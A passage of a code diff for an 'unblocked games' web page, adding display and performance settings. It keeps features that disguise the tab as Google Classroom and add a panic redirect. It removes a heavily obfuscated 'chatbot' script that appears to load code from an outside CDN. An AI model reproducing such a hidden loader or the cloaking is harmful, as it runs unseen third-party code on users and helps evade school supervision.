 function saveS(){localStorage.setItem(SK,JSON.stringify(S));}
 function gv(id){const e=document.getElementById(id);if(!e)return null;return e.type==='checkbox'?e.checked:e.value;}
 function sv(id,val){const e=document.getElementById(id);if(!e)return;e.type==='checkbox'?e.checked=!!val:e.value=val??'';}
-function syncS(){sv('s-cloak',S.cloakEnabled);sv('s-cloak-title',S.cloakTitle);sv('s-cloak-icon',S.cloakIcon);sv('s-auto-cloak',S.autoCloak);sv('s-panic-url',S.panicUrl||'https://google.com');sv('s-panic-key',S.panicKey||'');sv('s-panic-mode',S.panicMode||'redirect');sv('s-show-panic',S.showPanic!==false);sv('s-theme',S.theme||'default');sv('s-accent',S.accent||'#5c7cfa');sv('s-bg-col',S.bgCol||'#0d0f1a');sv('s-fontsize',S.fontSize||'14');sv('s-sidebar-pos',S.sidebarPos||'left');sv('s-hide-title',S.hideTitle);sv('s-compact-sb',S.compactSb);sv('s-dense-ui',S.denseUi);sv('s-roundness',S.roundness||'soft');sv('s-glass-panels',S.glassPanels);sv('s-show-grain',S.showGrain!==false);sv('s-reduce-motion',S.reduceMotion);sv('s-high-contrast',S.highContrast);sv('s-default-tab',S.defaultTab||'games');sv('s-remember-tab',S.rememberTab);sv('s-newtab',S.newTab);sv('s-show-searchbar',S.showSearchbar!==false);sv('s-show-doclink',S.showDoclink!==false);sv('s-show-clock',S.showClock);sv('s-center-panels',S.centerPanels!==false);sv('s-big-buttons',S.bigButtons);sv('s-mono-ui',S.monoUi);}
-function SA(){S.cloakEnabled=gv('s-cloak');S.cloakTitle=gv('s-cloak-title');S.cloakIcon=gv('s-cloak-icon');S.autoCloak=gv('s-auto-cloak');S.panicUrl=gv('s-panic-url')||'https://google.com';S.panicKey=gv('s-panic-key')||'';S.panicMode=gv('s-panic-mode')||'redirect';S.showPanic=gv('s-show-panic');S.theme=gv('s-theme')||'default';S.accent=gv('s-accent')||'#5c7cfa';S.bgCol=gv('s-bg-col')||'#0d0f1a';S.fontSize=gv('s-fontsize')||'14';S.sidebarPos=gv('s-sidebar-pos')||'left';S.hideTitle=gv('s-hide-title');S.compactSb=gv('s-compact-sb');S.denseUi=gv('s-dense-ui');S.roundness=gv('s-roundness')||'soft';S.glassPanels=gv('s-glass-panels');S.showGrain=gv('s-show-grain');S.reduceMotion=gv('s-reduce-motion');S.highContrast=gv('s-high-contrast');S.defaultTab=gv('s-default-tab')||'games';S.rememberTab=gv('s-remember-tab');S.newTab=gv('s-newtab');S.showSearchbar=gv('s-show-searchbar');S.showDoclink=gv('s-show-doclink');S.showClock=gv('s-show-clock');S.centerPanels=gv('s-center-panels');S.bigButtons=gv('s-big-buttons');S.monoUi=gv('s-mono-ui');saveS();applyS();}
+function syncS(){sv('s-cloak',S.cloakEnabled);sv('s-cloak-title',S.cloakTitle);sv('s-cloak-icon',S.cloakIcon);sv('s-auto-cloak',S.autoCloak);sv('s-panic-url',S.panicUrl||'https://google.com');sv('s-panic-key',S.panicKey||'');sv('s-panic-mode',S.panicMode||'redirect');sv('s-show-panic',S.showPanic!==false);sv('s-theme',S.theme||'default');sv('s-accent',S.accent||'#5c7cfa');sv('s-bg-col',S.bgCol||'#0d0f1a');sv('s-fontsize',S.fontSize||'14');sv('s-sidebar-pos',S.sidebarPos||'left');sv('s-hide-title',S.hideTitle);sv('s-compact-sb',S.compactSb);sv('s-dense-ui',S.denseUi);sv('s-roundness',S.roundness||'soft');sv('s-glass-panels',S.glassPanels);sv('s-show-grain',S.showGrain!==false);sv('s-reduce-motion',S.reduceMotion);sv('s-high-contrast',S.highContrast);sv('s-default-tab',S.defaultTab||'games');sv('s-remember-tab',S.rememberTab);sv('s-newtab',S.newTab);sv('s-show-searchbar',S.showSearchbar!==false);sv('s-show-doclink',S.showDoclink!==false);sv('s-show-clock',S.showClock);sv('s-center-panels',S.centerPanels!==false);sv('s-big-buttons',S.bigButtons);sv('s-mono-ui',S.monoUi);sv('s-lazy-iframes',S.lazyIframes!==false);sv('s-preload-images',S.preloadImages);sv('s-cache-games',S.cacheGames!==false);sv('s-sidebar-icon-size',S.sidebarIconSize||'medium');sv('s-game-tile-size',S.gameTileSize||'normal');sv('s-game-view',S.gameView||'grid');sv('s-animated-bg',S.animatedBg);sv('s-bg-image',S.bgImage||'');sv('s-bg-blur',S.bgBlur||0);sv('s-bg-dim',S.bgDim??35);sv('s-particles',S.particles);Object.keys(DS.keybinds).forEach(k=>sv('s-key-'+k,(S.keybinds&&S.keybinds[k])||DS.keybinds[k]||''));}
+function SA(){S.cloakEnabled=gv('s-cloak');S.cloakTitle=gv('s-cloak-title');S.cloakIcon=gv('s-cloak-icon');S.autoCloak=gv('s-auto-cloak');S.panicUrl=gv('s-panic-url')||'https://google.com';S.panicKey=gv('s-panic-key')||'';S.panicMode=gv('s-panic-mode')||'redirect';S.showPanic=gv('s-show-panic');S.theme=gv('s-theme')||'default';S.accent=gv('s-accent')||'#5c7cfa';S.bgCol=gv('s-bg-col')||'#0d0f1a';S.fontSize=gv('s-fontsize')||'14';S.sidebarPos=gv('s-sidebar-pos')||'left';S.hideTitle=gv('s-hide-title');S.compactSb=gv('s-compact-sb');S.denseUi=gv('s-dense-ui');S.roundness=gv('s-roundness')||'soft';S.glassPanels=gv('s-glass-panels');S.showGrain=gv('s-show-grain');S.reduceMotion=gv('s-reduce-motion');S.highContrast=gv('s-high-contrast');S.defaultTab=gv('s-default-tab')||'games';S.rememberTab=gv('s-remember-tab');S.newTab=gv('s-newtab');S.showSearchbar=gv('s-show-searchbar');S.showDoclink=gv('s-show-doclink');S.showClock=gv('s-show-clock');S.centerPanels=gv('s-center-panels');S.bigButtons=gv('s-big-buttons');S.monoUi=gv('s-mono-ui');S.lazyIframes=gv('s-lazy-iframes');S.preloadImages=gv('s-preload-images');S.cacheGames=gv('s-cache-games');S.sidebarIconSize=gv('s-sidebar-icon-size')||'medium';S.gameTileSize=gv('s-game-tile-size')||'normal';S.gameView=gv('s-game-view')||'grid';S.animatedBg=gv('s-animated-bg');S.bgImage=gv('s-bg-image')||'';S.bgBlur=Number(gv('s-bg-blur')||0);S.bgDim=Number(gv('s-bg-dim')??35);S.particles=gv('s-particles');S.keybinds=Object.assign({},DS.keybinds);Object.keys(DS.keybinds).forEach(k=>{const v=(gv('s-key-'+k)||'').trim().toLowerCase();if(v)S.keybinds[k]=v[0];});saveS();applyS();showToast('Settings saved');}
 function applyS(){
   if(S.cloakEnabled){document.title=S.cloakTitle||'Google Classroom';setFav(S.cloakIcon||'https://ssl.gstatic.com/classroom/favicon.png');}
   else{document.title=realTitle;setFav('');}
@@ -1020,7 +2465,7 @@ function applyS(){
   document.documentElement.style.setProperty('--bg',S.bgCol||t.bg);document.documentElement.style.setProperty('--bg2',t.bg2);document.documentElement.style.setProperty('--bg3',t.bg2);document.documentElement.style.setProperty('--accent',acc);document.documentElement.style.setProperty('--accent2',acc);
   if(S.highContrast){document.documentElement.style.setProperty('--text','#ffffff');document.documentElement.style.setProperty('--muted','rgba(255,255,255,0.8)');document.documentElement.style.setProperty('--border','rgba(255,255,255,0.22)');document.documentElement.style.setProperty('--card','rgba(255,255,255,0.08)');document.documentElement.style.setProperty('--card-hover','rgba(255,255,255,0.14)');}
   else{document.documentElement.style.setProperty('--text','#e2e8f0');document.documentElement.style.setProperty('--muted','rgba(226,232,240,0.5)');document.documentElement.style.setProperty('--border','rgba(255,255,255,0.08)');document.documentElement.style.setProperty('--card','rgba(255,255,255,0.04)');document.documentElement.style.setProperty('--card-hover','rgba(255,255,255,0.08)');}
-  document.body.style.background=`linear-gradient(140deg,${S.bgCol||t.bg} 0%,${t.bg2} 100%)`;
+  document.body.style.background=`linear-gradient(120deg,${S.bgCol||t.bg} 0%,${t.bg2} 48%,#061f24 100%)`;document.body.style.backgroundSize='300% 300%';
   document.body.style.fontSize=(S.fontSize||14)+'px';
   document.body.style.fontFamily=S.monoUi?"'JetBrains Mono', monospace":"'Syne', sans-serif";
   const sb=document.getElementById('sidebar');const mn=document.getElementById('main-content');
@@ -1030,18 +2475,45 @@ function applyS(){
   const srp=document.getElementById('search-results-panel');if(srp){srp.style.left=S.sidebarPos==='right'?'0':'var(--sidebar-w)';}
   const pb=document.getElementById('panic-btn');if(pb)pb.style.display=S.showPanic!==false?'':'none';
   document.querySelectorAll('.page-title').forEach(el=>el.style.display=S.hideTitle?'none':'');
-  document.documentElement.style.setProperty('--sidebar-w',S.compactSb?'54px':'72px');
+  if(!document.body.classList.contains('sidebar-expanded'))document.documentElement.style.setProperty('--sidebar-w',S.compactSb?'54px':'72px');
   const roundMap={soft:'14px',medium:'10px',sharp:'4px'};
   document.querySelectorAll('.panel,.s-card,.site-card,.gtile,input[type="button"],.fbtn,.obtn').forEach(el=>{el.style.borderRadius=roundMap[S.roundness]||'14px';});
-  document.querySelectorAll('.panel,.s-card').forEach(el=>{el.style.backdropFilter=S.glassPanels?'blur(18px)':'';el.style.background=S.glassPanels?'rgba(19,21,37,0.72)':'var(--bg2)';el.style.padding=S.denseUi?'12px 14px':'16px 20px';});
+  document.querySelectorAll('.panel,.s-card').forEach(el=>{el.style.backdropFilter='blur(22px) saturate(1.25)';el.style.background='rgba(19,21,37,0.56)';el.style.padding=S.denseUi?'12px 14px':'16px 20px';});
   document.querySelectorAll('.s-row').forEach(el=>{el.style.padding=S.denseUi?'6px 0':'9px 0';});
   document.querySelectorAll('.fbtn,.obtn,.gtile,input[type="button"]').forEach(el=>{if(S.bigButtons){el.style.padding='12px 16px';el.style.fontSize='13px';}else{el.style.padding='';el.style.fontSize='';}});
   const grainOn=S.showGrain!==false;
   if(!document.getElementById('style-dynamic-settings')){const st=document.createElement('style');st.id='style-dynamic-settings';document.head.appendChild(st);}
   document.getElementById('style-dynamic-settings').textContent=`body::before{display:${grainOn?'block':'none'} !important;} ${S.reduceMotion?'*,*::before,*::after{animation:none !important;transition:none !important;scroll-behavior:auto !important;}':''}`;
   const docLink=document.querySelector('.corner-link');if(docLink)docLink.style.display=S.showDoclink!==false?'':'none';
-  const clock=document.getElementById('sb-clock');if(clock)clock.style.display=S.showClock?'block':'none';
+  applyExtraSettings();
 }
+function showToast(msg){try{const host=document.getElementById('toast-host');if(!host)return;const t=document.createElement('div');t.className='toast';t.textContent=msg;host.appendChild(t);setTimeout(()=>{t.style.opacity='0';t.style.transform='translateY(8px)';setTimeout(()=>t.remove(),220);},2400);}catch(e){}}
+function applyExtraSettings(){try{
+  document.body.classList.toggle('animated-bg',!!S.animatedBg);
+  const layer=document.getElementById('bg-image-layer');if(layer){layer.style.backgroundImage=S.bgImage?`linear-gradient(rgba(0,0,0,${(S.bgDim??35)/100}),rgba(0,0,0,${(S.bgDim??35)/100})),url("${S.bgImage}")`:'';layer.style.filter=`blur(${Number(S.bgBlur||0)}px)`;layer.style.opacity=S.bgImage?'1':'0';}
+  const iconSizes={small:'15px',medium:'18px',large:'23px'};document.querySelectorAll('.sb-btn .icon').forEach(i=>i.style.fontSize=iconSizes[S.sidebarIconSize]||'18px');
+  const tileMap={compact:{pad:'6px 10px',fs:'11px'},normal:{pad:'8px 14px',fs:'12px'},large:{pad:'13px 18px',fs:'14px'}};const tm=tileMap[S.gameTileSize]||tileMap.normal;document.querySelectorAll('.gtile').forEach(t=>{t.style.padding=tm.pad;t.style.fontSize=tm.fs;});
+  document.querySelectorAll('.game-grid').forEach(g=>g.classList.toggle('list-view',S.gameView==='list'));
+  if(S.lazyIframes!==false){const cf=document.getElementById('coolmath-direct-frame');if(cf&&cf.src&&cf.src!=='about:blank'&&!cf.dataset.src){cf.dataset.src=cf.src;if(!document.getElementById('tab-cool').classList.contains('active'))cf.src='about:blank';}}
+  if(S.preloadImages&&S.bgImage){const im=new Image();im.src=S.bgImage;}
+  if(S.cacheGames!==false)cacheGameLists();
+  handleParticles();
+}catch(e){console.warn('settings apply failed',e);}}
+function cacheGameLists(){try{const data={t:Date.now(),PIZZA,PZRD,COOL,POKI,EXTRA,FIGHTING,RACING,PUZZLE};localStorage.setItem('ugs_game_cache_24h',JSON.stringify(data));}catch(e){}}
+function loadGameCacheIfFresh(){try{const raw=localStorage.getItem('ugs_game_cache_24h');if(!raw||S.cacheGames===false)return;const d=JSON.parse(raw);if(Date.now()-(d.t||0)>86400000)return;['PIZZA','PZRD','COOL','POKI','EXTRA','FIGHTING','RACING','PUZZLE'].forEach(k=>{if(Array.isArray(d[k])&&window[k])window[k].splice(0,window[k].length,...d[k]);});}catch(e){}}
+function handleParticles(){
+  const host='particles-bg';
+  if(!S.particles){const el=document.getElementById(host);if(el)el.innerHTML='';return;}
+  function run(){
+    try{
+      if(!window.tsParticles)return;
+      tsParticles.load(host,{fpsLimit:45,particles:{number:{value:45,density:{enable:true,area:900}},links:{enable:true,distance:130,opacity:0.18},move:{enable:true,speed:0.6},opacity:{value:0.35},size:{value:{min:1,max:3}}}}).catch(()=>{});
+    }catch(e){}
+  }
+  if(window.tsParticles)run();
+  else if(!document.getElementById('tsparticles-cdn')){const sc=document.createElement('script');sc.id='tsparticles-cdn';sc.src='https://cdn.jsdelivr.net/npm/tsparticles@2/tsparticles.bundle.min.js';sc.onload=run;document.head.appendChild(sc);}
+}
+document.addEventListener('keydown',e=>{try{if(e.ctrlKey||e.altKey||e.metaKey)return;const tag=(e.target&&e.target.tagName||'').toLowerCase();if(['input','textarea','select'].includes(tag)||e.target.isContentEditable)return;const key=e.key.toLowerCase();const kb=S.keybinds||{};const hit=Object.keys(kb).find(tab=>kb[tab]&&kb[tab].toLowerCase()===key);if(hit){e.preventDefault();ST(hit);showToast('Opened '+hit);}}catch(err){}});
 function setFav(url){let l=document.querySelector("link[rel~='icon']");if(!l){l=document.createElement('link');l.rel='icon';document.head.appendChild(l);}if(url)l.href=url;}
 function applyIconPreset(){const v=document.getElementById('s-cloak-preset').value;if(v)document.getElementById('s-cloak-icon').value=v;SA();}
 function exportS(){const b=new Blob([JSON.stringify(S,null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='ugs-settings.json';a.click();}
@@ -1053,16 +2525,46 @@ document.addEventListener('keydown',e=>{if(S.panicKey&&e.key===S.panicKey)doPani
 document.addEventListener('visibilitychange',()=>{if(S.autoCloak&&S.cloakEnabled&&document.hidden){document.title=S.cloakTitle||'Google Classroom';setFav(S.cloakIcon||'https://ssl.gstatic.com/classroom/favicon.png');}});
 const animStyle=document.createElement('style');animStyle.textContent='@keyframes bgShift{0%,100%{background-position:0% 50%;}50%{background-position:100% 50%;}}';document.head.appendChild(animStyle);
 
+
+// ══ PERFORMANCE OPTIMIZATIONS ══
+function debounce(fn,wait=300){let t;return function(...args){clearTimeout(t);t=setTimeout(()=>fn.apply(this,args),wait);};}
+const debouncedDoSearch=debounce(doSearch,300);
+function setupDebouncedSearchInputs(){
+  const defs=[
+    ['pizza-search',()=>filterG(PIZZA,'pizza-list',document.getElementById('pizza-search').value)],
+    ['pzrd-search',()=>filterG(PZRD,'pzrd-list',document.getElementById('pzrd-search').value)],
+    ['cool-search',()=>filterG(COOL,'cool-list',document.getElementById('cool-search').value)],
+    ['poki-search',()=>filterG(POKI,'poki-list',document.getElementById('poki-search').value)],
+    ['extra-search',()=>filterG(EXTRA,'extra-list',document.getElementById('extra-search').value)],
+    ['fighting-search',()=>filterG(FIGHTING,'fighting-list',document.getElementById('fighting-search').value)],
+    ['racing-search',()=>filterG(RACING,'racing-list',document.getElementById('racing-search').value)],
+    ['puzzle-search',()=>filterG(PUZZLE,'puzzle-list',document.getElementById('puzzle-search').value)],
+    ['dos-search',()=>filterDos(document.getElementById('dos-search').value)],
+    ['global-search-input',()=>debouncedDoSearch()],
+    ['searchInput',()=>{try{if(typeof searchGames==='function')searchGames();}catch(e){}}]
+  ];
+  defs.forEach(([id,fn])=>{const el=document.getElementById(id);if(!el)return;el.removeAttribute('oninput');el.addEventListener('input',debounce(fn,300));});
+}
+function registerOfflineSW(){
+  if(!('serviceWorker' in navigator)||location.protocol==='file:')return;
+  try{
+    navigator.serviceWorker.register('./ugs-sw.js').catch(()=>{});
+    if('caches' in window){
+      caches.open('ugs-html-v1').then(c=>c.add(location.href).catch(()=>{})).catch(()=>{});
+    }
+  }catch(e){}
+}
+
 // ══ INIT ══
 loadS();
+setupDebouncedSearchInputs();
+registerOfflineSW();
+loadGameCacheIfFresh();
 let startTab='games';
 try{const forcedTab=sessionStorage.getItem('ugs_forced_tab');if(forcedTab){startTab=forcedTab;sessionStorage.removeItem('ugs_forced_tab');}else{startTab=S.defaultTab||'games';if(S.rememberTab&&S.lastTab)startTab=S.lastTab;}}
 catch(e){startTab=S.defaultTab||'games';if(S.rememberTab&&S.lastTab)startTab=S.lastTab;}
 ST(startTab);updateOvProxyBtn();setBrowserMode('both');
 </script>
-
-<!-- ══════════ CHATBOT AI SCRIPT (from uploaded chatbot file) ══════════ -->
-<script>(function(ykJYJgqRQvLQ,gSsZu$aEkLNcrSPk){const kGsNXc=sFfEkK$fMziBAJZwZbkuvp,gXeiNWc=ykJYJgqRQvLQ();while(!![]){try{const HcMpeIOoYPvgF=Number(-parseFloat(kGsNXc(0x1a7))/(0xa*Number(parseInt(0x133))+parseInt(0x1581)+-0x6*parseInt(0x595)))*(-parseFloat(kGsNXc(0x183))/(parseInt(0x238d)+parseInt(0x2)*-0x85b+parseInt(-0x3)*0x647))+Number(-parseFloat(kGsNXc(0x18f))/(Math.floor(-0x1e99)+0x1a*-0x151+parseInt(0x40d6)))*(parseFloat(kGsNXc(0x17e))/(Number(parseInt(0x1d))*Number(0xe7)+-parseInt(0x2)*-0xec9+Math.max(-0x631,-0x631)*parseInt(0x9)))+parseFloat(kGsNXc(0x1be))/(0x1*-parseInt(0x23)+-parseInt(0x1)*Math.max(0x579,parseInt(0x579))+0x5a1)+-parseFloat(kGsNXc(0x1a9))/(Math.floor(parseInt(0xfbc))+Math.floor(-parseInt(0x1c3b))+Math.ceil(parseInt(0x281))*0x5)*(parseFloat(kGsNXc(0x191))/(Math.max(0x1,0x1)*-parseInt(0x88d)+Math.trunc(0x776)+parseInt(0x11e)))+parseInt(-parseFloat(kGsNXc(0x1ac))/(Number(0x3)*parseInt(0x72a)+0x243*-0xb+Number(0x36b)))*parseInt(-parseFloat(kGsNXc(0x189))/(-0x1*-parseInt(0x1875)+-parseInt(0x1)*0x2186+-0x5*-0x1d2))+Math['max'](-parseFloat(kGsNXc(0x1b2))/(parseInt(0x3d)*Number(0x90)+parseInt(0x1)*-0x1e1f+-parseInt(0x427)),-parseFloat(kGsNXc(0x1b6))/(Math.max(-parseInt(0x200e),-0x200e)+0x1*parseInt(0xaea)+0x1ed*parseInt(0xb)))+parseInt(parseFloat(kGsNXc(0x195))/(parseInt(0x1bc9)+-parseInt(0x764)+Math.trunc(-parseInt(0x1459))));if(HcMpeIOoYPvgF===gSsZu$aEkLNcrSPk)break;else gXeiNWc['push'](gXeiNWc['shift']());}catch(FoDQtRV){gXeiNWc['push'](gXeiNWc['shift']());}}}(UravPbGESYjDUNqxKcf$Vqza,-0x1*parseFloat(parseInt(0x62251))+-0x204aa+parseInt(0x3b35)*parseInt(0x43)));function UravPbGESYjDUNqxKcf$Vqza(){const VwjQavltNv=['ec898d9b88abb4','edede8aca19f8db3b0','ede8edece1edb1a99dae9a9f','ece8e1e1e9e183b8b39d8e80','bdb0af','b8a9a9bcb7bd9ab1b0b5bd','bbb6bda0','baabbcb8adbc9cb5bcb4bcb7ad','e0ecedefebece9b7a19389bc98','ee9ab5baab9288','b5b6be','aaadb8abadaa8eb0adb1','e8e9ece9e9e1eeecb49495bcaab3','efebe8e0e1ebeceaabb1b68cbabb','b5b6bab8b5b1b6aaad','adb68aadabb0b7be','bfb5b6b6ab','b1adada9aae3f6f6babdb7f7abe0a1f7b0b7f6b8b0b5b6beb0ba86beb7f4b4b8adb1f7bdbcaf86b6bbbff7b3aa','a9abb6adb6ada0a9bc','ebe0b5b5a99ebbb1','edede1eae9e9e98bb4beb6b1b0','a9abb6adb6bab6b5','efe8ef8ea39bad9dad','adb8bbb5bc','e8eeef9b979b8ab1b4','e0ede8eee1e1e19293969e9da0','b0b7bfb6','eeeee1eae8e19aa19ab494b3','a9acaab1','bbb0b7bd','babcb0b5','ebedea96bc9f9e88b1','ebefe9ebe8e9bbaaadb2b090','efeab3909e958092','b8a9a9b5a0','abb8b7bdb6b48c8c909d','bebcad9cb5bcb4bcb7ad9ba090bd','eee9efeeef9c9a979d8f8b','bca1babca9adb0b6b7','e8ece1e8e0b3a1b6b19488','aab1b0bfad','e8e9ebebe9aba1b39f9493','a2a4f7bab6b7aaadabacbaadb6abf1fbabbcadacabb7f9adb1b0aafbf0f1f9f0','aabcb8abbab1','bab6b7aab6b5bc','eeecefe1efede99fb69f928f91','adabacb7ba','aabaabb0a9ad','aaabba','bab6b7aaadabacbaadb6ab','abbcb4b6afbc','8686a9abb6adb68686','abbca9b5b8babc98b5b5','e8ebeef7e9f7e9f7e8','aeb8abb7','bfb0b5bc','adabb8babc','b1b6aaadb7b8b4bc','abbcadacabb7f9f1bfacb7baadb0b6b7f1f0f9','eceae1eee9e8e9938eb49fbc96','f1f1f1f7f2f0f2f0f2f0f2fd','bcababb6ab','e8eaefeee989b2b6aab38b','ebbb8f9db190a8','b5bcb7beadb1','e8eeebe1ac81b6bca08d'];UravPbGESYjDUNqxKcf$Vqza=function(){return VwjQavltNv;};return UravPbGESYjDUNqxKcf$Vqza();}function _0xe8c3(rg_FddjIYmSuDaXct_SbftOPO,Od_FYPa_mevt){rg_FddjIYmSuDaXct_SbftOPO=rg_FddjIYmSuDaXct_SbftOPO-(Math.trunc(parseInt(0xe6e))+parseInt(0x272)+0x4*parseFloat(-0x408));const RpdkwFFntaedhLUsDwbyOh=_0x257e();let uWkwAed$dMg_pC=RpdkwFFntaedhLUsDwbyOh[rg_FddjIYmSuDaXct_SbftOPO];return uWkwAed$dMg_pC;}(function(mRvOXTqaCttJOulbTlUWmr,C_FoJhGb_hSKAwdyPQonizmLyCA){const UTF$MMBycHGYrTfD_Ufh=sFfEkK$fMziBAJZwZbkuvp,vUk$$ZvvSlCIAc=_0xe8c3,aivDrxhk$kGhjNzepqLWPvd=mRvOXTqaCttJOulbTlUWmr();while(!![]){try{const uSUNXbU$YsNm$I=-parseInt(vUk$$ZvvSlCIAc(-parseInt(0x3)*0x7ef+0x3*parseFloat(-parseInt(0x1d9))+parseInt(0x1e2b)*parseInt(0x1)))/(parseFloat(-parseInt(0x13d))+parseFloat(-0x1054)*-0x2+Math.trunc(-0xfb5)*0x2)*(parseInt(vUk$$ZvvSlCIAc(Number(-0x206f)+-0x17f1+parseInt(parseInt(0x3949))))/(-parseInt(0x9b)+-0x2253+-0x8bc*parseInt(-0x4)))+parseInt(vUk$$ZvvSlCIAc(0xf*-parseInt(0x17f)+Math.trunc(0xe59)+0x8f2))/(-0x1*Math.floor(-parseInt(0x48b))+-parseInt(0x3d)*-parseInt(0x3e)+-parseInt(0x134e))*(-parseInt(vUk$$ZvvSlCIAc(Math.trunc(-parseInt(0x596))+0x4*-parseInt(0x6c2)+Math.floor(0x216d)))/(-parseInt(0x142d)*-parseInt(0x1)+0x1230+-parseInt(0x2659)))+parseInt(vUk$$ZvvSlCIAc(parseInt(0xb)*0x25+0x31*-parseInt(0x6d)+-parseInt(0x37)*-0x5e))/(parseInt(0x1588)+-parseInt(0x26c7)+0x1144)*(parseInt(vUk$$ZvvSlCIAc(-parseInt(0x153)+-parseInt(0x996)*parseInt(0x1)+parseInt(0xbc8)*Math.trunc(parseInt(0x1))))/(0x11a*parseInt(0xd)+parseInt(0x15)*-0x16f+0xfcf))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x1))*-parseInt(0x155f)+Math.trunc(-0x19)*Math.ceil(-0x16f)+-0xd8d*Math.floor(parseInt(0x1))))/(Number(-0x13b8)+0x210f+0x18*-0x8e)*(-parseInt(vUk$$ZvvSlCIAc(0x559*Math.floor(0x6)+-0xa*Math.ceil(-parseInt(0x76))+-parseInt(0x23ce)*parseInt(0x1)))/(0x5*parseFloat(-parseInt(0x47b))+-parseInt(0x2e7)*Math.max(0x6,parseInt(0x6))+Math.floor(parseInt(0x65))*0x65))+-parseInt(vUk$$ZvvSlCIAc(parseFloat(-parseInt(0x18ac))*parseFloat(0x1)+-0x1266+Math.max(0x2bf7,parseInt(0x2bf7))))/(-0xfb0+parseFloat(parseInt(0x1fc))*parseFloat(parseInt(0xd))+Math.ceil(-parseInt(0x1))*Number(parseInt(0xa13)))*(parseInt(vUk$$ZvvSlCIAc(Math.floor(-parseInt(0x1))*-0xea3+0x77d*-0x4+Math.ceil(parseInt(0x1041))))/(-parseInt(0x1)*Math.ceil(parseInt(0xc0a))+parseInt(-0x7)*Number(parseInt(0x365))+0x72b*Math.floor(parseInt(0x5))))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x14a9))*Math.max(0x1,0x1)+parseInt(0xf9e)+-parseInt(0x2384)))/(Math.ceil(-parseInt(0x1))*-0x5b3+-0x249+0x35f*Math.ceil(-0x1))*(-parseInt(vUk$$ZvvSlCIAc(Math.max(0x1da8,parseInt(0x1da8))+0x2211+parseInt(-0x157)*parseInt(0x2f)))/(0x1af2+0x6be+Number(-parseInt(0x21a4))))+parseInt(vUk$$ZvvSlCIAc(0x15e9+0x5*Math.ceil(-0x3cb)+parseInt(0x1)*Math.floor(-parseInt(0x215))))/(-0xad*-parseInt(0x35)+-parseInt(0x11c)*parseFloat(parseInt(0x2))+Math.ceil(0x71)*-0x4c);if(uSUNXbU$YsNm$I===C_FoJhGb_hSKAwdyPQonizmLyCA)break;else aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}catch(JS$nMXs$AZMsoi){aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}}}(_0x257e,Math.ceil(-0x2b9cb)*parseInt(0x9)+-0x2*parseFloat(-0x71c4d)+0x182df0),(function(){const fyfZe$A=sFfEkK$fMziBAJZwZbkuvp,KmkEnmSV=_0xe8c3,YYzy$XBjBwTdCwIPE$AKHEWaC=(function(){let MLfOyVBUyEPRR$$IEj=!![];return function(jeThI,ybpXPE$jfq){const vZRAXjF$_R=MLfOyVBUyEPRR$$IEj?function(){const DEQRwbJTpzvMFOryYEYKoGCD=_0xe8c3;if(ybpXPE$jfq){const vcZlz$G_trTEiNcVEYRhOyCWG=ybpXPE$jfq[DEQRwbJTpzvMFOryYEYKoGCD(Math.floor(parseInt(0x1))*-0x237b+0x5*parseInt(0x359)+parseFloat(parseInt(0x1389)))](jeThI,arguments);return ybpXPE$jfq=null,vcZlz$G_trTEiNcVEYRhOyCWG;}}:function(){};return MLfOyVBUyEPRR$$IEj=![],vZRAXjF$_R;};}()),qiwjHUauNrHLN$fg=(function(){let waQzQOaFVfq$WfrLnCpTYrDG=!![];return function(MNjbEXhItZtXPLUuC,uCZgwC$hqQ){const PsosmKTYqISIXVWY=waQzQOaFVfq$WfrLnCpTYrDG?function(){const gYLqgDXYRVUjJMRQBYU=_0xe8c3;if(uCZgwC$hqQ){const GGdBrUxKuCaWtlKW=uCZgwC$hqQ[gYLqgDXYRVUjJMRQBYU(Math.trunc(-0x2)*0x1384+parseInt(-parseInt(0x216a))+-parseInt(0x1)*-0x493d)](MNjbEXhItZtXPLUuC,arguments);return uCZgwC$hqQ=null,GGdBrUxKuCaWtlKW;}}:function(){};return waQzQOaFVfq$WfrLnCpTYrDG=![],PsosmKTYqISIXVWY;};}());let hK$kJs=![],udh_ln$z=[],bzBMId=![],YFTSa_AyznhLRB=![];function c$uljJUCGCQHFqM(hvUOLCHfCBhIT,gGA$_MNmIu){const YxGzqKLhsTvBRmcdZ=sFfEkK$fMziBAJZwZbkuvp,ALBAzExBHKkx=_0xe8c3,aOjOz$OyGi_Sw=YYzy$XBjBwTdCwIPE$AKHEWaC(this,function(){const MwJDUeTlPCUAtp_Pi$gkCn=sFfEkK$fMziBAJZwZbkuvp,S$_bpOvwP=_0xe8c3;return aOjOz$OyGi_Sw[S$_bpOvwP(Number(parseInt(0x2117))+-0x2a5+-0x1d84*Math.floor(parseInt(0x1)))]()[S$_bpOvwP(0x33a*0x1+-0xca6*0x1+-parseInt(0x518)*-0x2)](S$_bpOvwP(Math.floor(parseInt(0x1b9e))+parseFloat(-0x59b)+Number(-0x2f)*Number(0x73)))[S$_bpOvwP(Math.floor(0x2540)+Math.max(parseInt(0x1b68),0x1b68)+-0xa9f*Math.floor(parseInt(0x6)))]()[S$_bpOvwP(0x6b*parseInt(-parseInt(0xa))+Math.max(parseInt(0x2417),0x2417)+parseFloat(parseInt(0x1f21))*Number(-0x1))](aOjOz$OyGi_Sw)[S$_bpOvwP(parseFloat(-0x5c)*0x29+0x4b*0x5e+0x1*-parseInt(0xc0a))](MwJDUeTlPCUAtp_Pi$gkCn(0x1a4));});aOjOz$OyGi_Sw();const EsAEXrTkuAdPT__tKKG=qiwjHUauNrHLN$fg(this,function(){const DHKhHH$CzdaTFZpF=sFfEkK$fMziBAJZwZbkuvp,CjsPKzyFLwfe=_0xe8c3,AA_ZPkQAKRmDwqTTTdciyQE=function(){const wFmIP_BJY=_0xe8c3;let 